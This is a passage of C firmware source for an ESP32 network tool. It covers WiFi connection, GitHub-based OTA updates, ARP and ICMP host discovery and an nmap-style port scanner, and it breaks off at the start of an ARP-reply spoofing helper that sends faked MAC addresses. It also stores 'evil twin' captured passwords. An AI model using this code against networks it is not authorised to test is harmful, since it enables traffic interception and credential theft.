    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif) {
        esp_netif_destroy(ap_netif);
    }
    ap_netif_handle = NULL;
    
    wifi_initialized = false;
    current_radio_mode = RADIO_MODE_NONE;
    
    // Reinitialize WiFi
    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "Failed to reinitialize WiFi");
        return 0;
    }
    
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "STA interface not found");
        return 0;
    }

    if (use_static_ip) {
        esp_netif_dhcpc_stop(sta_netif);
        esp_netif_ip_info_t ip_info = { 0 };
        ip_info.ip = static_ip;
        ip_info.netmask = static_mask;
        ip_info.gw = static_gw;
        esp_err_t ret = esp_netif_set_ip_info(sta_netif, &ip_info);
        if (ret != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to set static IP: %s", esp_err_to_name(ret));
            return 0;
        }
        if (use_dns1) {
            esp_netif_dns_info_t dns = { 0 };
            dns.ip.u_addr.ip4 = static_dns1;
            dns.ip.type = IPADDR_TYPE_V4;
            ret = esp_netif_set_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns);
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set DNS1: %s", esp_err_to_name(ret));
            }
        }
        if (use_dns2) {
            esp_netif_dns_info_t dns = { 0 };
            dns.ip.u_addr.ip4 = static_dns2;
            dns.ip.type = IPADDR_TYPE_V4;
            ret = esp_netif_set_dns_info(sta_netif, ESP_NETIF_DNS_BACKUP, &dns);
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set DNS2: %s", esp_err_to_name(ret));
            }
        }
    } else {
        esp_netif_dhcpc_start(sta_netif);
    }

    // Configure STA and connect
    wifi_config_t sta_config = { 0 };
    strncpy((char *)sta_config.sta.ssid, ssid, sizeof(sta_config.sta.ssid) - 1);
    if (password[0] != '\0') {
        strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password) - 1);
        sta_config.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
    } else {
        sta_config.sta.threshold.authmode = WIFI_AUTH_OPEN;
    }
    
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    
    // Reset result flag before connecting
    wifi_connect_result = 0;
    esp_wifi_connect();
    
    MY_LOG_INFO(TAG, "Waiting for connection result...");
    
    // Wait for connection result (max 15 seconds)
    for (int i = 0; i < 150 && wifi_connect_result == 0; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    if (wifi_connect_result == 1) {
        esp_netif_ip_info_t ip_info = { 0 };
        bool has_ip = wait_for_sta_ip_info(&ip_info, 5000);
        MY_LOG_INFO(TAG, "SUCCESS: Connected to '%s'", ssid);
        if (password[0] != '\0') {
            save_evil_twin_password(ssid, password);
        }
        if (has_ip) {
            if (use_static_ip) {
                MY_LOG_INFO(TAG, "Static IP: " IPSTR ", Netmask: " IPSTR ", GW: " IPSTR,
                            IP2STR(&ip_info.ip), IP2STR(&ip_info.netmask), IP2STR(&ip_info.gw));
                if (use_dns1) {
                    MY_LOG_INFO(TAG, "DNS1: " IPSTR, IP2STR(&static_dns1));
                }
                if (use_dns2) {
                    MY_LOG_INFO(TAG, "DNS2: " IPSTR, IP2STR(&static_dns2));
                }
            } else {
                MY_LOG_INFO(TAG, "DHCP IP: " IPSTR ", Netmask: " IPSTR ", GW: " IPSTR,
                            IP2STR(&ip_info.ip), IP2STR(&ip_info.netmask), IP2STR(&ip_info.gw));
            }
        } else {
            MY_LOG_INFO(TAG, "No IP assigned yet. Wait for DHCP.");
        }
        if (ota_after_connect) {
            if (!has_ip) {
                MY_LOG_INFO(TAG, "OTA: no IP yet. Wait for DHCP.");
                return 0;
            }
            if (!ota_start_check(NULL, false)) {
                return 0;
            }
        }
        return 0;
    } else if (wifi_connect_result == -1) {
        MY_LOG_INFO(TAG, "FAILED: Connection to '%s' failed. Check SSID/password and signal.", ssid);
        return 0;
    } else {
        MY_LOG_INFO(TAG, "TIMEOUT: Connection to '%s' timed out", ssid);
        return 0;
    }
}

static int cmd_ota_check(int argc, char **argv) {
    oled_display_update_full("> OTA Update", "  Checking...", "  github.com", "  v" JANOS_VERSION " current");
    const char *tag = NULL;
    bool force_latest = false;

    if (argc > 2) {
        MY_LOG_INFO(TAG, "Usage: ota_check [latest|<tag>]");
        return 1;
    }
    if (argc == 2) {
        if (strcasecmp(argv[1], "latest") == 0) {
            force_latest = true;
        } else {
            tag = argv[1];
        }
    }

    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "OTA: WiFi not ready");
        return 1;
    }
    if (!ota_is_connected()) {
        MY_LOG_INFO(TAG, "OTA: not connected or no IP. Use 'wifi_connect' first.");
        return 1;
    }

    if (!ota_start_check(tag, force_latest)) {
        return 1;
    }

    return 0;
}

static int cmd_ota_list(int argc, char **argv) {
    (void)argc;
    (void)argv;

    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "OTA: WiFi not ready");
        return 1;
    }
    if (!ota_is_connected()) {
        MY_LOG_INFO(TAG, "OTA: not connected or no IP. Use 'wifi_connect' first.");
        return 1;
    }

    char api_url[256];
    int res = snprintf(api_url, sizeof(api_url),
                       "https://api.github.com/repos/%s/%s/releases?per_page=5",
                       OTA_GITHUB_OWNER, OTA_GITHUB_REPO);
    if (res < 0 || res >= (int)sizeof(api_url)) {
        return 1;
    }

    char *body = NULL;
    size_t body_len = 0;
    esp_err_t err = ota_http_get(api_url, &body, &body_len);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: list failed: %s", esp_err_to_name(err));
        return 1;
    }
    (void)body_len;

    cJSON *root = cJSON_Parse(body);
    if (!root || !cJSON_IsArray(root)) {
        cJSON_Delete(root);
        free(body);
        MY_LOG_INFO(TAG, "OTA: list parse failed");
        return 1;
    }

    int idx = 0;
    cJSON *item = NULL;
    cJSON_ArrayForEach(item, root) {
        cJSON *tag = cJSON_GetObjectItem(item, "tag_name");
        cJSON *name = cJSON_GetObjectItem(item, "name");
        cJSON *prerelease = cJSON_GetObjectItem(item, "prerelease");
        cJSON *published = cJSON_GetObjectItem(item, "published_at");
        if (!cJSON_IsString(tag)) {
            continue;
        }
        const char *channel = (cJSON_IsBool(prerelease) && cJSON_IsTrue(prerelease)) ? "dev" : "main";
        const char *title = (cJSON_IsString(name) && name->valuestring[0] != '\0') ? name->valuestring : "";
        const char *date = (cJSON_IsString(published) && strlen(published->valuestring) >= 10)
                               ? published->valuestring
                               : "";
        char date_buf[11] = {0};
        if (date[0] != '\0') {
            memcpy(date_buf, date, 10);
            date_buf[10] = '\0';
        }
        MY_LOG_INFO(TAG, "OTA[%d]: %s (%s) %s %s",
                    idx,
                    tag->valuestring,
                    channel,
                    date_buf,
                    title);
        idx++;
    }

    cJSON_Delete(root);
    free(body);
    return 0;
}

static int cmd_ota_channel(int argc, char **argv) {
    if (argc == 1) {
        MY_LOG_INFO(TAG, "OTA channel: %s", ota_channel);
        return 0;
    }
    if (argc != 2) {
        MY_LOG_INFO(TAG, "Usage: ota_channel <main|dev>");
        return 1;
    }

    if (strcasecmp(argv[1], "main") != 0 && strcasecmp(argv[1], "dev") != 0) {
        MY_LOG_INFO(TAG, "Usage: ota_channel <main|dev>");
        return 1;
    }

    snprintf(ota_channel, sizeof(ota_channel), "%s", argv[1]);
    if (!ota_save_channel_to_nvs(ota_channel)) {
        MY_LOG_INFO(TAG, "OTA: failed to save channel");
        return 1;
    }

    MY_LOG_INFO(TAG, "OTA channel set to: %s", ota_channel);
    return 0;
}

static int cmd_ota_info(int argc, char **argv) {
    (void)argc;
    (void)argv;

    const esp_partition_t *boot = esp_ota_get_boot_partition();
    const esp_partition_t *running = esp_ota_get_running_partition();
    const esp_partition_t *next = esp_ota_get_next_update_partition(NULL);
    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;
    if (running) {
        esp_ota_get_state_partition(running, &state);
    }

    MY_LOG_INFO(TAG, "OTA boot: %s offset=0x%lx size=0x%lx",
                boot ? boot->label : "n/a",
                boot ? (unsigned long)boot->address : 0UL,
                boot ? (unsigned long)boot->size : 0UL);
    MY_LOG_INFO(TAG, "OTA running: %s offset=0x%lx size=0x%lx state=%d",
                running ? running->label : "n/a",
                running ? (unsigned long)running->address : 0UL,
                running ? (unsigned long)running->size : 0UL,
                (int)state);
    MY_LOG_INFO(TAG, "OTA next: %s offset=0x%lx size=0x%lx",
                next ? next->label : "n/a",
                next ? (unsigned long)next->address : 0UL,
                next ? (unsigned long)next->size : 0UL);

    const esp_partition_t *ota0 = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
                                                           ESP_PARTITION_SUBTYPE_APP_OTA_0,
                                                           NULL);
    const esp_partition_t *ota1 = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
                                                           ESP_PARTITION_SUBTYPE_APP_OTA_1,
                                                           NULL);
    const esp_partition_t *parts[2] = { ota0, ota1 };
    const char *labels[2] = { "ota_0", "ota_1" };

    for (int i = 0; i < 2; i++) {
        const esp_partition_t *part = parts[i];
        if (!part) {
            MY_LOG_INFO(TAG, "APP[%d]: %s missing", i, labels[i]);
            continue;
        }
        esp_app_desc_t desc = {0};
        esp_ota_img_states_t part_state = ESP_OTA_IMG_UNDEFINED;
        esp_ota_get_state_partition(part, &part_state);
        esp_err_t desc_err = esp_ota_get_partition_description(part, &desc);
        if (desc_err == ESP_OK) {
            MY_LOG_INFO(TAG,
                        "APP[%d]: %s offset=0x%lx size=0x%lx subtype=0x%x state=%d ver=%s build=%s %s",
                        i,
                        part->label,
                        (unsigned long)part->address,
                        (unsigned long)part->size,
                        part->subtype,
                        (int)part_state,
                        desc.version,
                        desc.date,
                        desc.time);
        } else {
            MY_LOG_INFO(TAG, "APP[%d]: %s offset=0x%lx size=0x%lx subtype=0x%x state=%d",
                        i,
                        part->label,
                        (unsigned long)part->address,
                        (unsigned long)part->size,
                        part->subtype,
                        (int)part_state);
        }
    }

    return 0;
}

static int cmd_ota_boot(int argc, char **argv) {
    if (argc != 2) {
        MY_LOG_INFO(TAG, "Usage: ota_boot <ota_0|ota_1>");
        return 1;
    }

    const esp_partition_t *target = NULL;
    if (strcasecmp(argv[1], "ota_0") == 0) {
        target = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
                                          ESP_PARTITION_SUBTYPE_APP_OTA_0,
                                          NULL);
    } else if (strcasecmp(argv[1], "ota_1") == 0) {
        target = esp_partition_find_first(ESP_PARTITION_TYPE_APP,
                                          ESP_PARTITION_SUBTYPE_APP_OTA_1,
                                          NULL);
    } else {
        MY_LOG_INFO(TAG, "Usage: ota_boot <ota_0|ota_1>");
        return 1;
    }

    if (!target) {
        MY_LOG_INFO(TAG, "OTA: target partition not found");
        return 1;
    }

    esp_err_t err = esp_ota_set_boot_partition(target);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "OTA: set boot partition failed: %s", esp_err_to_name(err));
        return 1;
    }

    MY_LOG_INFO(TAG, "OTA: boot set to %s, restarting", target->label);
    safe_restart();  // unmount SD card before restart
    return 0;
}

// --- Shared host discovery (ARP batches + ICMP ping sweep) ---

#define DISCOVER_MAX_HOSTS 254
#define DISCOVER_ARP_POLL_INTERVAL_MS 200
#define DISCOVER_ARP_POLL_ROUNDS 20
#define DISCOVER_ICMP_WAIT_MS 2000
#define DISCOVER_ICMP_ID 0x4A4E

typedef struct {
    uint32_t ip_addr;
    uint8_t  mac[6];
    bool     mac_known;
} discovered_host_t;

static uint16_t icmp_checksum(const void *data, size_t len)
{
    const uint8_t *p = (const uint8_t *)data;
    uint32_t sum = 0;
    for (size_t i = 0; i < len - 1; i += 2)
        sum += (uint16_t)(p[i] << 8 | p[i + 1]);
    if (len & 1)
        sum += (uint16_t)(p[len - 1] << 8);
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return htons((uint16_t)~sum);
}

static bool discover_host_already_found(const discovered_host_t *hosts, int count, uint32_t ip_addr)
{
    for (int i = 0; i < count; i++) {
        if (hosts[i].ip_addr == ip_addr)
            return true;
    }
    return false;
}

static int discover_lan_hosts(discovered_host_t *hosts, int max_hosts)
{
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
        return -1;
    }

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "STA interface not found");
        return -1;
    }

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to get IP info. DHCP may not have completed.");
        return -1;
    }
    if (ip_info.ip.addr == 0) {
        MY_LOG_INFO(TAG, "No IP address assigned yet. Wait for DHCP.");
        return -1;
    }

    uint32_t ip_h  = ntohl(ip_info.ip.addr);
    uint32_t mask_h = ntohl(ip_info.netmask.addr);
    uint32_t network   = ip_h & mask_h;
    uint32_t broadcast = network | ~mask_h;
    uint32_t subnet_size = broadcast - network - 1;
    if (subnet_size > (uint32_t)max_hosts)
        subnet_size = (uint32_t)max_hosts;

    MY_LOG_INFO(TAG, "Our IP: " IPSTR ", Netmask: " IPSTR,
                IP2STR(&ip_info.ip), IP2STR(&ip_info.netmask));

    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif) {
        MY_LOG_INFO(TAG, "Failed to get LwIP netif");
        return -1;
    }

    int host_count = 0;
    int arp_found = 0;

    // --- Phase 1: ARP flood + repeated table polling ---
    MY_LOG_INFO(TAG, "Phase 1: ARP scan (%lu hosts)...", (unsigned long)subnet_size);

    int sent = 0;
    for (uint32_t target = network + 1; target < broadcast && sent < max_hosts; target++, sent++) {
        ip4_addr_t tip;
        tip.addr = htonl(target);
        etharp_request(lwip_netif, &tip);
        if (sent % 10 == 0)
            vTaskDelay(pdMS_TO_TICKS(10));
    }

    MY_LOG_INFO(TAG, "Sent %d ARP requests, polling table for %d seconds...",
                sent, (DISCOVER_ARP_POLL_INTERVAL_MS * DISCOVER_ARP_POLL_ROUNDS) / 1000);

    for (int round = 0; round < DISCOVER_ARP_POLL_ROUNDS; round++) {
        vTaskDelay(pdMS_TO_TICKS(DISCOVER_ARP_POLL_INTERVAL_MS));
        for (int i = 0; i < ARP_TABLE_SIZE && host_count < max_hosts; i++) {
            ip4_addr_t *ip_ret;
            struct netif *netif_ret;
            struct eth_addr *eth_ret;
            if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                if (!discover_host_already_found(hosts, host_count, ip_ret->addr)) {
                    hosts[host_count].ip_addr = ip_ret->addr;
                    memcpy(hosts[host_count].mac, eth_ret->addr, 6);
                    hosts[host_count].mac_known = true;
                    host_count++;
                    arp_found++;
                }
            }
        }
    }

    MY_LOG_INFO(TAG, "ARP: found %d hosts", arp_found);

    // --- Phase 2: ICMP ping sweep for unfound IPs ---
    int ping_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (ping_sock < 0) {
        MY_LOG_INFO(TAG, "ICMP socket failed, skipping ping sweep");
        return host_count;
    }

    struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
    setsockopt(ping_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    typedef struct __attribute__((packed)) {
        uint8_t  type;
        uint8_t  code;
        uint16_t checksum;
        uint16_t id;
        uint16_t seqno;
    } icmp_echo_t;

    int pings_sent = 0;
    uint16_t seq = 0;
    for (uint32_t target = network + 1; target < broadcast && (int)seq < max_hosts; target++) {
        uint32_t target_net = htonl(target);
        if (discover_host_already_found(hosts, host_count, target_net))
            continue;

        icmp_echo_t echo = {0};
        echo.type = 8;
        echo.code = 0;
        echo.id   = htons(DISCOVER_ICMP_ID);
        echo.seqno = htons(seq++);
        echo.checksum = 0;
        echo.checksum = icmp_checksum(&echo, sizeof(echo));

        struct sockaddr_in dest = {
            .sin_family = AF_INET,
            .sin_addr.s_addr = target_net,
        };
        sendto(ping_sock, &echo, sizeof(echo), 0,
               (struct sockaddr *)&dest, sizeof(dest));
        pings_sent++;

        if (pings_sent % 10 == 0)
            vTaskDelay(pdMS_TO_TICKS(5));
    }

    MY_LOG_INFO(TAG, "Phase 2: sent %d ICMP pings, waiting for replies...", pings_sent);
    vTaskDelay(pdMS_TO_TICKS(DISCOVER_ICMP_WAIT_MS));

    int icmp_found = 0;
    char recv_buf[64];
    struct sockaddr_in from;
    socklen_t fromlen;
    for (;;) {
        fromlen = sizeof(from);
        int n = recvfrom(ping_sock, recv_buf, sizeof(recv_buf), 0,
                         (struct sockaddr *)&from, &fromlen);
        if (n <= 0) break;

        if (n < 20 + (int)sizeof(icmp_echo_t)) continue;
        int ihl = (recv_buf[0] & 0x0F) * 4;
        if (n < ihl + (int)sizeof(icmp_echo_t)) continue;
        icmp_echo_t *reply = (icmp_echo_t *)(recv_buf + ihl);
        if (reply->type != 0 || reply->code != 0) continue;
        if (ntohs(reply->id) != DISCOVER_ICMP_ID) continue;

        uint32_t src_ip = from.sin_addr.s_addr;
        if (host_count < max_hosts &&
            !discover_host_already_found(hosts, host_count, src_ip)) {
            hosts[host_count].ip_addr = src_ip;
            memset(hosts[host_count].mac, 0, 6);
            hosts[host_count].mac_known = false;
            host_count++;
            icmp_found++;
        }
    }
    close(ping_sock);

    MY_LOG_INFO(TAG, "ICMP: found %d additional hosts", icmp_found);
    MY_LOG_INFO(TAG, "Total: %d hosts discovered (%d ARP + %d ICMP)",
                host_count, arp_found, icmp_found);

    return host_count;
}

// --- Host listing commands ---

static int cmd_list_hosts(int argc, char **argv) {
    (void)argc; (void)argv;
    oled_display_update_full("> Host Scan", "  Scanning LAN", "", "  Working...");

    discovered_host_t *hosts = calloc(DISCOVER_MAX_HOSTS, sizeof(discovered_host_t));
    if (!hosts) {
        MY_LOG_INFO(TAG, "Out of memory for host list");
        return 1;
    }

    int host_count = discover_lan_hosts(hosts, DISCOVER_MAX_HOSTS);
    if (host_count < 0) {
        free(hosts);
        return 1;
    }

    MY_LOG_INFO(TAG, "=== Discovered Hosts ===");
    int arp_cnt = 0, icmp_cnt = 0;
    for (int i = 0; i < host_count; i++) {
        ip4_addr_t tmp;
        tmp.addr = hosts[i].ip_addr;
        uint8_t *m = hosts[i].mac;
        if (hosts[i].mac_known) {
            MY_LOG_INFO(TAG, "  " IPSTR "  ->  %02X:%02X:%02X:%02X:%02X:%02X  [ARP]",
                IP2STR(&tmp), m[0], m[1], m[2], m[3], m[4], m[5]);
            arp_cnt++;
        } else {
            MY_LOG_INFO(TAG, "  " IPSTR "  ->  (MAC unknown)  [ICMP]", IP2STR(&tmp));
            icmp_cnt++;
        }
    }
    MY_LOG_INFO(TAG, "========================");
    MY_LOG_INFO(TAG, "Found %d hosts (%d via ARP, %d via ICMP)", host_count, arp_cnt, icmp_cnt);

    free(hosts);
    return 0;
}

static int cmd_list_hosts_vendor(int argc, char **argv) {
    (void)argc; (void)argv;
    oled_display_update_full("> Host Scan", "  Scanning LAN", "  + vendor lookup", "  Working...");

    discovered_host_t *hosts = calloc(DISCOVER_MAX_HOSTS, sizeof(discovered_host_t));
    if (!hosts) {
        MY_LOG_INFO(TAG, "Out of memory for host list");
        return 1;
    }

    int host_count = discover_lan_hosts(hosts, DISCOVER_MAX_HOSTS);
    if (host_count < 0) {
        free(hosts);
        return 1;
    }

    MY_LOG_INFO(TAG, "=== Discovered Hosts ===");
    int arp_cnt = 0, icmp_cnt = 0;
    for (int i = 0; i < host_count; i++) {
        ip4_addr_t tmp;
        tmp.addr = hosts[i].ip_addr;
        uint8_t *m = hosts[i].mac;
        if (hosts[i].mac_known) {
            const char *vendor = lookup_vendor_name(m);
            MY_LOG_INFO(TAG, "  " IPSTR "  ->  %02X:%02X:%02X:%02X:%02X:%02X  [%s]  [ARP]",
                IP2STR(&tmp), m[0], m[1], m[2], m[3], m[4], m[5],
                vendor ? vendor : "Unknown");
            arp_cnt++;
        } else {
            MY_LOG_INFO(TAG, "  " IPSTR "  ->  (MAC unknown)  [ICMP]", IP2STR(&tmp));
            icmp_cnt++;
        }
    }
    MY_LOG_INFO(TAG, "========================");
    MY_LOG_INFO(TAG, "Found %d hosts (%d via ARP, %d via ICMP)", host_count, arp_cnt, icmp_cnt);

    free(hosts);
    return 0;
}

// --- Port scanner (nmap-like) ---

typedef struct {
    uint16_t port;
    const char *name;
} nmap_port_entry_t;

static const nmap_port_entry_t nmap_ports[] = {
    // --- quick (first 20) ---
    {   21, "FTP"        },
    {   22, "SSH"        },
    {   23, "Telnet"     },
    {   25, "SMTP"       },
    {   53, "DNS"        },
    {   80, "HTTP"       },
    {  110, "POP3"       },
    {  135, "MSRPC"      },
    {  139, "NetBIOS"    },
    {  143, "IMAP"       },
    {  443, "HTTPS"      },
    {  445, "SMB"        },
    {  993, "IMAPS"      },
    { 1433, "MSSQL"      },
    { 3306, "MySQL"      },
    { 3389, "RDP"        },
    { 5432, "PostgreSQL" },
    { 5900, "VNC"        },
    { 8080, "HTTP-alt"   },
    { 8443, "HTTPS-alt"  },
    // --- medium (next 30) ---
    {  111, "RPCbind"    },
    {  161, "SNMP"       },
    {  162, "SNMP-trap"  },
    {  389, "LDAP"       },
    {  465, "SMTPS"      },
    {  514, "Syslog"     },
    {  515, "LPD"        },
    {  554, "RTSP"       },
    {  587, "Submission" },
    {  636, "LDAPS"      },
    {  873, "Rsync"      },
    {  995, "POP3S"      },
    { 1080, "SOCKS"      },
    { 1443, "IES-LM"     },
    { 1521, "Oracle"     },
    { 1883, "MQTT"       },
    { 2049, "NFS"        },
    { 2181, "ZooKeeper"  },
    { 2375, "Docker"     },
    { 3000, "Grafana"    },
    { 3128, "Squid"      },
    { 4443, "Pharos"     },
    { 5000, "UPnP"       },
    { 5060, "SIP"        },
    { 5222, "XMPP"       },
    { 5601, "Kibana"     },
    { 6379, "Redis"      },
    { 8000, "HTTP-alt2"  },
    { 8888, "HTTP-alt3"  },
    { 9090, "Prometheus" },
    // --- heavy (next 50) ---
    {   69, "TFTP"       },
    {  179, "BGP"        },
    {  502, "Modbus"     },
    {  548, "AFP"        },
    {  623, "IPMI"       },
    {  631, "IPP"        },
    {  902, "VMware"     },
    { 1194, "OpenVPN"    },
    { 1234, "VLC"        },
    { 1723, "PPTP"       },
    { 1900, "SSDP"       },
    { 2082, "cPanel"     },
    { 2083, "cPanel-SSL" },
    { 2222, "SSH-alt"    },
    { 2484, "Oracle-SSL" },
    { 3268, "LDAP-GC"    },
    { 3269, "LDAPS-GC"   },
    { 3690, "SVN"        },
    { 4000, "ICQ"        },
    { 4444, "Metasploit" },
    { 4567, "Sinatra"    },
    { 4848, "GlassFish"  },
    { 5353, "mDNS"       },
    { 5433, "PostgreAlt" },
    { 5672, "AMQP"       },
    { 5984, "CouchDB"    },
    { 6000, "X11"        },
    { 6443, "K8s-API"    },
    { 6660, "IRC"        },
    { 6667, "IRC"        },
    { 7001, "WebLogic"   },
    { 7077, "Spark"      },
    { 7474, "Neo4j"      },
    { 8008, "HTTP-alt4"  },
    { 8081, "HTTP-alt5"  },
    { 8181, "HTTP-alt6"  },
    { 8444, "HTTP-alt7"  },
    { 8834, "Nessus"     },
    { 8883, "MQTT-SSL"   },
    { 9000, "SonarQube"  },
    { 9092, "Kafka"      },
    { 9100, "JetDirect"  },
    { 9200, "Elastic"    },
    { 9443, "WSO2"       },
    {10000, "Webmin"     },
    {11211, "Memcached"  },
    {15672, "RabbitMQ"   },
    {25565, "Minecraft"  },
    {27017, "MongoDB"    },
    {28017, "MongoHTTP"  },
    {50000, "SAP"        },
};
#define NMAP_PORTS_QUICK   20
#define NMAP_PORTS_MEDIUM  50
#define NMAP_PORTS_HEAVY  100
#define NMAP_CONNECT_TIMEOUT_MS 500

static bool nmap_check_port(uint32_t ip_net_order, uint16_t port)
{
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return false;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(port),
        .sin_addr.s_addr = ip_net_order,
    };

    int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret == 0) {
        close(sock);
        return true;
    }
    if (errno != EINPROGRESS) {
        close(sock);
        return false;
    }

    fd_set wset;
    FD_ZERO(&wset);
    FD_SET(sock, &wset);
    struct timeval tv = {
        .tv_sec  = NMAP_CONNECT_TIMEOUT_MS / 1000,
        .tv_usec = (NMAP_CONNECT_TIMEOUT_MS % 1000) * 1000,
    };

    bool open = false;
    if (select(sock + 1, NULL, &wset, NULL, &tv) > 0) {
        int so_err = 0;
        socklen_t len = sizeof(so_err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_err, &len);
        open = (so_err == 0);
    }

    close(sock);
    return open;
}

static int cmd_start_nmap(int argc, char **argv)
{
    int port_count = NMAP_PORTS_QUICK;
    const char *level_name = "quick";
    uint32_t single_ip = 0;
    bool single_host_mode = false;

    for (int i = 1; i < argc; i++) {
        if (strcasecmp(argv[i], "quick") == 0) {
            port_count = NMAP_PORTS_QUICK;
            level_name = "quick";
        } else if (strcasecmp(argv[i], "medium") == 0) {
            port_count = NMAP_PORTS_MEDIUM;
            level_name = "medium";
        } else if (strcasecmp(argv[i], "heavy") == 0) {
            port_count = NMAP_PORTS_HEAVY;
            level_name = "heavy";
        } else {
            struct in_addr parsed;
            if (inet_aton(argv[i], &parsed)) {
                single_ip = parsed.s_addr;
                single_host_mode = true;
            } else {
                MY_LOG_INFO(TAG, "Usage: start_nmap [quick|medium|heavy] [IP]");
                return 1;
            }
        }
    }

    oled_display_update_full("> NMAP Scan",
        single_host_mode ? "  Single host" : "  Discovering hosts",
        "", "  Working...");
    log_memory_info("start_nmap");

    MY_LOG_INFO(TAG, "Scan level: %s (%d ports)", level_name, port_count);

    discovered_host_t *hosts = calloc(DISCOVER_MAX_HOSTS, sizeof(discovered_host_t));
    if (!hosts) {
        MY_LOG_INFO(TAG, "Out of memory for host list");
        return 1;
    }

    int host_count = 0;

    if (single_host_mode) {
        hosts[0].ip_addr = single_ip;
        memset(hosts[0].mac, 0, 6);
        hosts[0].mac_known = false;
        host_count = 1;
        MY_LOG_INFO(TAG, "Single-host mode, skipping host discovery.");
    } else {
        host_count = discover_lan_hosts(hosts, DISCOVER_MAX_HOSTS);
        if (host_count < 0) {
            free(hosts);
            return 1;
        }
    }

    MY_LOG_INFO(TAG, "Scanning %d host(s), %d ports each (%s)...",
                host_count, port_count, level_name);

    int total_open = 0;

    MY_LOG_INFO(TAG, "=== NMAP Scan Results ===");
    for (int h = 0; h < host_count; h++) {
        uint32_t host_ip = hosts[h].ip_addr;
        uint8_t *m = hosts[h].mac;

        char ip_str[16];
        ip4_addr_t tmp;
        tmp.addr = host_ip;
        snprintf(ip_str, sizeof(ip_str), IPSTR, IP2STR(&tmp));

        char oled_line[40];
        snprintf(oled_line, sizeof(oled_line), "  %d/%d %s", h + 1, host_count, ip_str);
        oled_display_update_full("> NMAP Scan", oled_line, "  Scanning ports...", "");

        if (hosts[h].mac_known) {
            MY_LOG_INFO(TAG, "Host: %s  (%02X:%02X:%02X:%02X:%02X:%02X)",
                        ip_str, m[0], m[1], m[2], m[3], m[4], m[5]);
        } else {
            MY_LOG_INFO(TAG, "Host: %s  (MAC unknown)", ip_str);
        }

        int open_on_host = 0;
        for (int p = 0; p < port_count; p++) {
            if (operation_stop_requested) break;
            if (p % 10 == 0) {
                int end_p = p + 9;
                if (end_p >= port_count) end_p = port_count - 1;
                MY_LOG_INFO(TAG, "  Scanning %s ports %d-%d [%d/%d] ...",
                            ip_str, nmap_ports[p].port, nmap_ports[end_p].port, p + 1, port_count);
                char oled_prog[40];
                snprintf(oled_prog, sizeof(oled_prog), "  Port %d/%d (%d-%d)",
                         p + 1, port_count, nmap_ports[p].port, nmap_ports[end_p].port);
                oled_display_update_full("> NMAP Scan", oled_line, oled_prog, "");
            }
            if (nmap_check_port(host_ip, nmap_ports[p].port)) {
                MY_LOG_INFO(TAG, "  %5d/tcp  open  %s",
                            nmap_ports[p].port, nmap_ports[p].name);
                open_on_host++;
                total_open++;
            }
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "  (scan stopped by user)");
            break;
        }
        if (open_on_host == 0) {
            MY_LOG_INFO(TAG, "  (no open ports)");
        }
    }
    MY_LOG_INFO(TAG, "=========================");
    MY_LOG_INFO(TAG, "Scanned %d hosts, found %d open ports", host_count, total_open);

    free(hosts);

    oled_display_update_full("> NMAP Done",
        host_count > 0 ? "  Scan complete" : "  No hosts found",
        "", "");

    return 0;
}

// Helper to parse MAC address from string "AA:BB:CC:DD:EE:FF"
static bool parse_mac_address(const char *str, uint8_t *mac) {
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

// ARP packet structure (Ethernet + ARP)
#define ARP_PACKET_SIZE 42  // 14 (Eth header) + 28 (ARP header)
#define ETH_TYPE_ARP 0x0806
#define ARP_HWTYPE_ETH 1
#define ARP_PROTO_IP 0x0800
#define ARP_OP_REPLY 2

// Helper to build and send ARP reply packet
static void send_arp_reply(struct netif *lwip_netif, 
                           const uint8_t *dst_mac,      // Ethernet destination
                           const uint8_t *src_mac,      // Ethernet source (fake)
                           const uint8_t *sender_mac,   // ARP sender MAC (fake)
